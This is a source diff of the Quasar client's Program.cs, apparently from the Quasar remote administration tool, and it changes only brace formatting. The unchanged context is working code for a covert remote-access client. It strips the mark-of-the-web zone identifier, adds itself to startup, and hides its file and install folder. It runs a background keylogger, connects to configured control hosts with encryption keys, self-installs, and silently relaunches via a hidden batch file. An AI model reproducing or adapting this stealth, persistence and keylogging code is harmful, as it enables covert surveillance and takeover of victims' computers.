@@ -14,24 +14,19 @@ using System.IO;
 using System.Threading;
 using System.Windows.Forms;
 
-namespace Quasar.Client
-{
-    internal static class Program
-    {
+namespace Quasar.Client {
+    internal static class Program {
         public static QuasarClient ConnectClient;
         private static ApplicationContext _msgLoop;
 
         [STAThread]
-        private static void Main(string[] args)
-        {
+        private static void Main(string[] args) {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;
 
-            if (Settings.Initialize())
-            {
-                if (Initialize())
-                {
+            if (Settings.Initialize()) {
+                if (Initialize()) {
                     if (!QuasarClient.Exiting)
                         ConnectClient.Connect();
                 }
@@ -41,8 +36,7 @@ namespace Quasar.Client
             Exit();
         }
 
-        private static void Exit()
-        {
+        private static void Exit() {
             // Don't wait for other threads
             if (_msgLoop != null || Application.MessageLoop)
                 Application.Exit();
@@ -50,15 +44,12 @@ namespace Quasar.Client
                 Environment.Exit(0);
         }
 
-        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
-        {
-            if (e.IsTerminating)
-            {
+        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e) {
+            if (e.IsTerminating) {
                 string batchFile = BatchFile.CreateRestartBatch(ClientData.CurrentPath);
                 if (string.IsNullOrEmpty(batchFile)) return;
 
-                ProcessStartInfo startInfo = new ProcessStartInfo
-                {
+                ProcessStartInfo startInfo = new ProcessStartInfo {
                     WindowStyle = ProcessWindowStyle.Hidden,
                     UseShellExecute = true,
                     FileName = batchFile
@@ -68,15 +59,13 @@ namespace Quasar.Client
             }
         }
 
-        private static void Cleanup()
-        {
+        private static void Cleanup() {
             CommandHandler.CloseShell();
             if (CommandHandler.StreamCodec != null)
                 CommandHandler.StreamCodec.Dispose();
             if (Keylogger.Instance != null)
                 Keylogger.Instance.Dispose();
-            if (_msgLoop != null)
-            {
+            if (_msgLoop != null) {
                 _msgLoop.ExitThread();
                 _msgLoop.Dispose();
                 _msgLoop = null;
@@ -84,8 +73,7 @@ namespace Quasar.Client
             MutexHelper.CloseMutex();
         }
 
-        private static bool Initialize()
-        {
+        private static bool Initialize() {
             var hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
 
             // process with same mutex is already running
@@ -95,56 +83,42 @@ namespace Quasar.Client
             Aes128.SetDefaultKey(Settings.KEY, Settings.AUTHKEY);
             ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? Settings.SUBDIRECTORY + @"\" : "") + Settings.INSTALLNAME);
             GeoLocationHelper.Initialize();
-            
+
             FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
 
-            if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
-            {
+            if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath) {
                 WindowsAccountHelper.StartUserIdleCheckThread();
 
-                if (Settings.STARTUP)
-                {
+                if (Settings.STARTUP) {
                     if (!Startup.AddToStartup())
                         ClientData.AddToStartupFailed = true;
                 }
 
-                if (Settings.INSTALL && Settings.HIDEFILE)
-                {
-                    try
-                    {
+                if (Settings.INSTALL && Settings.HIDEFILE) {
+                    try {
                         File.SetAttributes(ClientData.CurrentPath, FileAttributes.Hidden);
-                    }
-                    catch (Exception)
-                    {
+                    } catch (Exception) {
                     }
                 }
-                if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
-                {
-                    try
-                    {
+                if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY)) {
+                    try {
                         DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.InstallPath));
                         di.Attributes |= FileAttributes.Hidden;
 
-                    }
-                    catch (Exception)
-                    {
+                    } catch (Exception) {
                     }
                 }
-                if (Settings.ENABLELOGGER)
-                {
-                    new Thread(() =>
-                    {
+                if (Settings.ENABLELOGGER) {
+                    new Thread(() => {
                         _msgLoop = new ApplicationContext();
                         Keylogger logger = new Keylogger(15000);
                         Application.Run(_msgLoop);
-                    }) {IsBackground = true}.Start();
+                    }) { IsBackground = true }.Start();
                 }
 
                 ConnectClient = new QuasarClient(hosts);
                 return true;
-            }
-            else
-            {
+            } else {
                 MutexHelper.CloseMutex();
                 ClientInstaller.Install(ConnectClient);
                 return false;
